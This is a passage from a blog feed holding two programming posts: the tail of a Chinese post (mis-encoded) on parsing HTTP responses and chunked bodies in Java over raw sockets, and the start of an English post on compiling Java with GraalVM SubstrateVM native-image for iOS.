class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpCodec</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    ByteBuffer byteBuffer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HttpCodec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        byteBuffer = ByteBuffer.allocate(<span class="number">10</span> * <span class="number">1024</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è§£æå“åº”è¡Œ</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readLine</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span> b;</span><br><span class="line">            <span class="keyword">boolean</span> EndOfLine = <span class="keyword">false</span>;</span><br><span class="line">            <span class="comment">// æ ‡è®°</span></span><br><span class="line">            byteBuffer.clear();</span><br><span class="line">            byteBuffer.mark();</span><br><span class="line">            <span class="keyword">while</span> ((b = (<span class="keyword">byte</span>) inputStream.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                byteBuffer.put(b);</span><br><span class="line">                <span class="comment">// è¯»å–åˆ° /r åˆ™è®°å½•ï¼Œåˆ¤æ–­ä¸‹ä¸€ä¸ªå­—èŠ‚æ˜¯å¦ä¸º /n</span></span><br><span class="line">                <span class="keyword">if</span> (b == HttpConst.CR) &#123;</span><br><span class="line">                    EndOfLine = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (EndOfLine) &#123;</span><br><span class="line">                    <span class="comment">// ä¸Šä¸€ä¸ªå­—èŠ‚æ˜¯ /rï¼Œå¹¶ä¸”æœ¬æ¬¡è¯»å–åˆ° /n</span></span><br><span class="line">                    <span class="keyword">if</span> (b == HttpConst.LF) &#123;</span><br><span class="line">                        <span class="comment">// è·å¾—ç›®å‰è¯»å–çš„æ‰€æœ‰å­—èŠ‚</span></span><br><span class="line">                        <span class="keyword">byte</span>[] lineBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[byteBuffer.position()];</span><br><span class="line">                        <span class="comment">// è¿”å›æ ‡è®°ä½ç½®</span></span><br><span class="line">                        byteBuffer.reset();</span><br><span class="line">                        byteBuffer.get(lineBytes);</span><br><span class="line">                        <span class="comment">// æ¸…ç©º buffer é‡æ–°æ ‡è®°</span></span><br><span class="line">                        byteBuffer.clear();</span><br><span class="line">                        byteBuffer.mark();</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">new</span> String(lineBytes);</span><br><span class="line">                    &#125;</span><br><span class="line">                    EndOfLine = <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IOException(e);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Response Read Line."</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è§£æå“åº”å¤´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Map&lt;String, String&gt; <span class="title">readHeaders</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        HashMap&lt;String, String&gt; headers = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            String line = readLine(inputStream);</span><br><span class="line">            <span class="comment">// è¯»å–åˆ°ç©ºè¡Œï¼Œåˆ™ä¸‹ä¸€è¡Œå¼€å§‹ä¸ºå“åº”ä½“</span></span><br><span class="line">            <span class="keyword">if</span> (line == <span class="keyword">null</span> || line.equals(<span class="string">"\r\n"</span>)) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> index = line.indexOf(<span class="string">":"</span>);</span><br><span class="line">            <span class="keyword">if</span> (index &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                String name = line.substring(<span class="number">0</span>, index);</span><br><span class="line">                <span class="comment">// ":" ç§»åŠ¨ä¸¤ä½ï¼Œæ€»é•¿åº¦å‡å» "\r\n"</span></span><br><span class="line">                String value = line.substring(index + <span class="number">2</span>, line.length() - <span class="number">2</span>);</span><br><span class="line">                headers.put(name, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> headers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è§£æå“åº”ä½“</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">byte</span>[] readBytes(InputStream inputStream, <span class="keyword">int</span> length) <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = <span class="keyword">new</span> <span class="keyword">byte</span>[length];</span><br><span class="line">        <span class="keyword">int</span> readNum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            readNum += inputStream.read(bytes, readNum, length - readNum);</span><br><span class="line">            <span class="comment">// è¯»å–å®Œæ¯•</span></span><br><span class="line">            <span class="keyword">if</span> (readNum == length) &#123;</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è§£æåˆ†å—ç¼–ç å½¢å¼çš„å“åº”ä½“</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">readChunked</span><span class="params">(InputStream inputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">boolean</span> isEmptyData = <span class="keyword">false</span>;</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (len &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                String line = readLine(inputStream);</span><br><span class="line">                <span class="comment">// å‡æ‰ "\r\n"</span></span><br><span class="line">                line = line.substring(<span class="number">0</span>, line.length() - <span class="number">2</span>);</span><br><span class="line">                <span class="comment">// Chunked ç¼–ç æœ€åä¸€æ®µæ•°æ®ä¸º 0 \r\n\r\n</span></span><br><span class="line">                len = Integer.valueOf(line, <span class="number">16</span>);</span><br><span class="line">                isEmptyData = len == <span class="number">0</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// å—çš„é•¿åº¦ä¸åŒ…æ‹¬ "\r\n"ï¼Œæ‰€ä»¥åŠ  2ï¼Œå°† "\r\n" è¯»èµ°</span></span><br><span class="line">                <span class="keyword">byte</span>[] bytes = readBytes(inputStream, len + <span class="number">2</span>);</span><br><span class="line">                buffer.append(<span class="keyword">new</span> String(bytes));</span><br><span class="line">                len = -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">if</span> (isEmptyData) &#123;</span><br><span class="line">                    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><ul><li><p>Java åŸç”Ÿ Socket ä¸­ InputStream çš„è·å–ï¼Œä¸ºå­—èŠ‚æµï¼šInputStream inputStream = socket.getInputStream(); </p></li><li><p>åœ¨è§£æå“åº”è¡Œ readLine() ä¸­ï¼Œéœ€è¦è®¾ç½® EndOfLine æ ‡å¿—ï¼Œç”¨æ¥åˆ¤æ–­æ˜¯å“åº”è¡Œçš„æœ€åå­—èŠ‚ â€œ\r\nâ€ã€‚</p></li><li><p>HTTP å“åº”ä½“æœ‰åˆ†å—ç¼–ç çš„æ–¹å¼ï¼Œè¡¨ç°ä¸ºå¤´éƒ¨å­—æ®µ Transfer-Encoding: chunkedï¼Œæœ‰æ­¤å­—æ®µåˆ™æ•°æ®é€šè¿‡åˆ†å—ä¼ è¾“ã€‚åŒºåˆ«äº Content-Length æ˜¾ç¤ºæ•°æ®çš„é•¿åº¦ï¼Œåˆ†å—ç¼–ç å¯ä»¥ä¸é¢„å…ˆçŸ¥é“å‘é€å†…å®¹çš„æ€»å¤§å°ã€‚</p></li></ul><h2 id="æµ‹è¯•ç±»"><a href="#æµ‹è¯•ç±»" class="headerlink" title="æµ‹è¯•ç±»"></a>æµ‹è¯•ç±»</h2><p>è¯·æ±‚é«˜å¾·åœ°å›¾çš„å¤©æ°” APIã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SocketTest</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">httpTest</span><span class="params">()</span> <span class="keyword">throws</span> MalformedURLException </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> HttpUrl url = <span class="keyword">new</span> HttpUrl(<span class="string">"http://restapi.amap.com/v3/weather/weatherInfo?city=å—äº¬&amp;key= "</span>);</span><br><span class="line">        System.out.println(<span class="string">"protocolï¼š"</span> + url.getProtocol());</span><br><span class="line">        System.out.println(<span class="string">"hostï¼š"</span> + url.getHost());</span><br><span class="line">        System.out.println(<span class="string">"portï¼š"</span> + url.getPort());</span><br><span class="line">        System.out.println(<span class="string">"pathï¼š"</span> + url.getPath());</span><br><span class="line">        <span class="comment">// ä½¿ç”¨ StringBuffer</span></span><br><span class="line">        StringBuffer buffer = createRequestPacket(url);</span><br><span class="line">        Socket socket = <span class="keyword">new</span> Socket();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Socket å»ºç«‹è¿æ¥ï¼ŒInetSocketAddress åŒ…å« host + port</span></span><br><span class="line">            socket.connect(<span class="keyword">new</span> InetSocketAddress(url.getHost(), url.getPort()), <span class="number">5000</span>);</span><br><span class="line">            <span class="comment">// è·å–è¾“å…¥è¾“å‡ºæµ</span></span><br><span class="line">            <span class="keyword">final</span> OutputStream outputStream = socket.getOutputStream();</span><br><span class="line">            <span class="keyword">final</span> InputStream inputStream = socket.getInputStream();</span><br><span class="line">            <span class="comment">// è¾“å‡ºçš„åä¸‰è¡Œåˆ†åˆ«ä¸ºè¯·æ±‚è¡Œã€è¯·æ±‚å¤´ã€ç©ºè¡Œã€è¯·æ±‚ä½“</span></span><br><span class="line">            System.out.println(<span class="string">"å¼€å§‹å‘é€æŠ¥æ–‡... \n"</span> + buffer);</span><br><span class="line">            sendRequest(buffer, outputStream);</span><br><span class="line">            <span class="comment">// ä½¿ç”¨ lambda è¡¨è¾¾å¼</span></span><br><span class="line">            <span class="keyword">new</span> Thread(() -&gt; &#123;</span><br><span class="line">                HttpCodec httpCodec = <span class="keyword">new</span> HttpCodec();</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">// è§£æå“åº”è¡Œ</span></span><br><span class="line">                    String responseLine = httpCodec.readLine(inputStream);</span><br><span class="line">                    System.out.println(<span class="string">"å“åº”è¡Œï¼š"</span> + responseLine);</span><br><span class="line">                    System.out.println(<span class="string">"å“åº”å¤´ï¼š"</span>);</span><br><span class="line">                    <span class="comment">// è§£æå“åº”å¤´</span></span><br><span class="line">                    Map&lt;String, String&gt; headers = httpCodec.readHeaders(inputStream);</span><br><span class="line">                    <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : headers.entrySet()) &#123;</span><br><span class="line">                        System.out.println(entry.getKey() + <span class="string">":"</span> + entry.getValue());</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// è§£æ Content-Length å“åº”ä½“</span></span><br><span class="line">                    <span class="keyword">if</span> (headers.containsKey(<span class="string">"Content-Length"</span>)) &#123;</span><br><span class="line">                        <span class="keyword">int</span> length = Integer.valueOf(headers.get(<span class="string">"Content-Length"</span>));</span><br><span class="line">                        <span class="keyword">byte</span>[] bytes = httpCodec.readBytes(inputStream, length);</span><br><span class="line">                        System.out.println(<span class="string">"\nå“åº”ä½“ï¼š"</span> + <span class="keyword">new</span> String(bytes));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;  <span class="comment">// åˆ†å—ç¼–ç </span></span><br><span class="line">                        String response = httpCodec.readChunked(inputStream);</span><br><span class="line">                        System.out.println(<span class="string">"\nåˆ†å—å“åº”ä½“ï¼š"</span> + response);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).start();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                Thread.sleep(<span class="number">1000</span> * <span class="number">10</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * åˆ›å»º Http è¯·æ±‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> StringBuffer <span class="title">createRequestPacket</span><span class="params">(HttpUrl url)</span> </span>&#123;</span><br><span class="line">        StringBuffer buffer = <span class="keyword">new</span> StringBuffer();</span><br><span class="line">        <span class="comment">// è¯·æ±‚è¡Œ</span></span><br><span class="line">        buffer.append(HttpConst.GET);</span><br><span class="line">        buffer.append(url.getPath());</span><br><span class="line">        buffer.append(<span class="string">" "</span>);</span><br><span class="line">        buffer.append(<span class="string">"HTTP/1.1"</span>);</span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="comment">// è¯·æ±‚å¤´</span></span><br><span class="line">        buffer.append(HttpConst.HOST);</span><br><span class="line">        buffer.append(url.getHost());</span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="comment">// è¯·æ±‚ä½“ï¼Œå¯ä»¥ä¸ºç©º</span></span><br><span class="line">        buffer.append(HttpConst.CRLF);</span><br><span class="line">        <span class="keyword">return</span> buffer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‘é€ Http è¯·æ±‚</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">sendRequest</span><span class="params">(StringBuffer buffer, OutputStream outputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        outputStream.write(buffer.toString().getBytes());</span><br><span class="line">        outputStream.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨å‘é€ Http è¯·æ±‚ sendRequest() ä¸­ï¼Œwrite() å…ˆæŠŠæ•°æ®å†™åˆ°å†…å­˜ç¼“å†²åŒºï¼ˆå­—ç¬¦è½¬æ¢ä¸ºå­—èŠ‚ï¼‰ï¼Œflush() å†æŠŠå†…å­˜ç¼“å†²åŒºçš„æ•°æ®åˆ·æ–°åˆ°æ–‡ä»¶ä¸­ã€‚</p><h2 id="æµ‹è¯•ç»“æœ"><a href="#æµ‹è¯•ç»“æœ" class="headerlink" title="æµ‹è¯•ç»“æœ"></a>æµ‹è¯•ç»“æœ</h2><img src="/images/blog12/test.png" width="80%"/><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>ç”¨ Socket è¿›è¡Œç½‘ç»œé€šä¿¡ï¼Œæœ¬è´¨ä¸Šæ˜¯ I/O æ“ä½œï¼Œå°†å“åº”æŠ¥æ–‡è§£ææˆå†…å­˜ä¸­çš„å¯¹è±¡ï¼Œæˆ‘è®¤ä¸ºæ˜¯æ ¸å¿ƒã€‚</p><p>åç»­æˆ‘å°†ç»§ç»­ç ”ç©¶ Spring Boot æ¡†æ¶å†…æ˜¯å¦‚ä½•å¤„ç† HTTP è¯·æ±‚ï¼Œå¹¶è½¬å‘åˆ°å¯¹åº” Controller ä¸Šçš„ã€‚</p><h2 id="å¼•ç”¨"><a href="#å¼•ç”¨" class="headerlink" title="å¼•ç”¨"></a>å¼•ç”¨</h2><p><a href="https://blog.csdn.net/CrazyMo_/article/details/88642354" target="_blank" rel="noopener">https://blog.csdn.net/CrazyMo_/article/details/88642354</a></p>]]></content>
        <author>
            <name><![CDATA[é£çš„ä¸ªäººç½‘ç«™]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/substratevm-on-ios.html</id>
        <title><![CDATA[SubstrateVM on iOS]]></title>
        <updated>2021-03-09T00:27:10+08:00</updated>
        <link href="https://www.noisyfox.io/substratevm-on-ios.html"/>
        <content type="text/html" src="https://www.noisyfox.io/substratevm-on-ios.html"><![CDATA[<p>This article records my attempts &amp; findings when using SubstrateVM to run JVM compatible languages on iOS. The goal is to replace the outdated Android Runtime (ART) currently used by MOE with SubstrateVM. Currently it&#8217;s still in a very early stage and this article is not meant to be a complete guide on running Java app on iOS, but to share my progress and give anyone who&#8217;s interested in this something to start with.</p>



<p>I will keep updating this article once I made any more progress, you could join the discussion by leaving comments down below, or join the Multi-OS Engine Community discord channel: <a href="https://discord.gg/m5t3qNXTWj" target="_blank" rel="noreferrer noopener">https://discord.gg/m5t3qNXTWj</a></p>



<hr class="wp-block-separator"/>



<h2>Motivation</h2>



<p>Current version of MOE is based on the ART from Android 6 and support Java 7 features only. With retrolambda we get limited support of Java 8 features like Lambda and default methods. However the lack of a true Java 8 support makes it harder and harder to use as nowadays more and more 3rd libraries moved to Java 8 (and even higher).</p>



<p>It is possible that we update the ART to a later version (such as from Android 7+), however this requires a huge amount of effort because:</p>



<ul><li>The Android code is not well documented</li><li>The code structure changes significantly between each Android major releases</li><li>ART has its own native code generator, instead of LLVM, so no bitcode support</li><li>ART is not designed to be run on any OS other than Android, and requires a lot of modifications to be able to run on iOS because Apple does things differently than Google</li><li>ART is not fully compatible with any &#8220;official&#8221; JDK release (Google likes to mix features from different JDK versions)</li></ul>



<p>On the contrary, SubstrateVM is:</p>



<ul><li>Created &amp; supported by Oracle</li><li>Support iOS (and may other platforms) by design</li><li>Based on official OpenJDK</li><li>Currently support Java 8 and Java 11</li><li>Better stacktrace</li></ul>



<p>This gives a clear advantage to SubstrateVM over ART as a much more reliable and futureproof solution.</p>



<p>SubstrateVM does come with some downsides, namely:</p>



<ul><li>Not production-ready yet</li><li>Binary size is larger reportedly</li><li>Slower and more memory consumption during compiling</li></ul>



<p>But those issues should be resolved eventually so I&#8217;m not that worried about at the moment.</p>



<hr class="wp-block-separator"/>



<h2>Problem to be Solved</h2>



<p>Here are some problems that need to be figured out before we could confidently use this in MOE:</p>



<ul><li>How to compile Java code into a static shared library / iOS framework / Mach-O file so it can be linked to a normal iOS app (partly solved, see below)</li><li>Figure out the difference to the (modified) ART used in MOE currently, and how this could cause issues when trying porting existing MOE project to this new VM</li><li>How to debug the application once it has been compiled to native binary</li><li>How bitcode could be supported</li></ul>



<hr class="wp-block-separator"/>



<h2>Acknowledgments</h2>



<p>The work I&#8217;ve done so far largely based on the awesome work from the Gluon Substrate project: <a href="https://github.com/gluonhq/substrate" target="_blank" rel="noreferrer noopener">https://github.com/gluonhq/substrate</a>.</p>



<p>Gluon is a framework that allows you to right JavaFX application that can be run on multiple platforms, including iOS (which is based on SubstrateVM). I highly recommend to check out their awesome project!</p>



<p>In the following parts I might include some code fragments from this project and might also uses certain files directly from Gluon&#8217;s website for demonstration purpose.</p>



<p>However, this article and any work I did/will do in the future are not directly related to Gluon or any of their product.</p>



<hr class="wp-block-separator"/>



<h2>Preparation</h2>



<p>Most of the work I&#8217;ve done are under MacOS, so all the tools I mention later are all MacOS versions. I&#8217;ll assume most of you have access to a Mac and are familiar with some basic dev tools &amp; processes on Mac, so I won&#8217;t explain everything in this article. Again, this is not a complete guide.</p>



<p>Download the official prebuilt GraalVM from <a href="https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-21.0.0.2" target="_blank" rel="noreferrer noopener">https://github.com/graalvm/graalvm-ce-builds/releases/tag/vm-21.0.0.2</a>. This is the version I&#8217;m using while writing this part. Download the <a href="https://github.com/graalvm/graalvm-ce-builds/releases/download/vm-21.0.0.2/graalvm-ce-java11-darwin-amd64-21.0.0.2.tar.gz">graalvm-ce-java11-darwin-amd64-21.0.0.2.tar.gz</a> and extract it somewhere.</p>



<p>This is a complete JDK distribution, so I simply added it to the <strong>jenv</strong> for easier version switching. Once the GraalVM is activated as current JDK, run the following command to install the SubstrateVM (i.e. native-image):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">gu install --jvm native-image
gu install --jvm llvm-toolchain</pre>



<hr class="wp-block-separator"/>



<h2>Hello World</h2>



<p>I created a very simple hello world in Java:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="java" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="Test.java" data-enlighter-group="test-java">public class Test {
    public static void main(String[] args) {
        System.out.println("hello world!");
    }
}</pre>



<p>Then compile it to class file:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="shell" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">javac Test.java</pre>



<hr class="wp-block-separator"/>



<h2>Java Bytecode to Binary</h2>



<p>The document of SubstrateVM states by using the <code data-enlighter-language="shell" class="EnlighterJSRAW">native-image</code> command, one can compile the java bytecode (the .class file) into either an <a href="https://www.graalvm.org/reference-manual/native-image/#build-a-native-image" target="_blank" rel="noreferrer noopener">executable</a> (the default option) or a <a href="https://www.graalvm.org/reference-manual/native-image/#build-a-shared-library" target="_blank" rel="noreferrer noopener">shared (dynamic) library</a>. However none of these options fits our needs because:</p>



<ul><li>We need to link the generated binary into a normal iOS application, so it has to be a library, not a standalone executable</li><li>iOS does not allow loading our own dynamic library at runtime, so the library needs to be statically linked to our app</li></ul>



<p>Before I even worry about this problem, as a proof of concept, I first tried to compile it into a x86_64 Darwin executable and ran it using <code data-enlighter-language="shell" class="EnlighterJSRAW">native-image Test</code>:</p>



<div class="wp-block-image is-style-default"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png" target="_blank" rel="noopener"><img loading="lazy" width="516" height="354" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png" alt="SubstrateVM on iOS - compile with default settings" class="wp-image-812" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image.png 516w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-300x206.png 300w" sizes="(max-width: 516px) 100vw, 516px" /></a><figcaption>Compile with default settings</figcaption></figure></div>



<p>Ok that wasn&#8217;t too hard. Now let&#8217;s try using the LLVM backend by adding <code data-enlighter-language="shell" class="EnlighterJSRAW">-H:CompilerBackend=llvm</code> option to the command:</p>



<div class="wp-block-image"><figure class="aligncenter size-large"><a href="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png" target="_blank" rel="noopener"><img loading="lazy" width="828" height="709" src="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png" alt="SubstrateVM on iOS - llvm compile failed" class="wp-image-814" srcset="https://www.noisyfox.io/wp-content/uploads/2021/03/image-1.png 828w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-1-300x257.png 300w, https://www.noisyfox.io/wp-content/uploads/2021/03/image-1-768x658.png 768w" sizes="(max-width: 828px) 100vw, 828px" /></a><figcaption>LLVM compile failed with no extra options</figcaption></figure></div>



<p>Oops! A quick search of <code data-enlighter-language="raw" class="EnlighterJSRAW">ImageSingletons do not contain key org.graalvm.home.HomeFinder</code> lead me to <a href="https://github.com/oracle/graal/issues/1889#issuecomment-559136202" target="_blank" rel="noreferrer noopener">this github issue</a>, which tells me to add <code data-enlighter-language="shell" class="EnlighterJSRAW">--features=org.graalvm.home.HomeFinderFeature</code> to the command:</p>



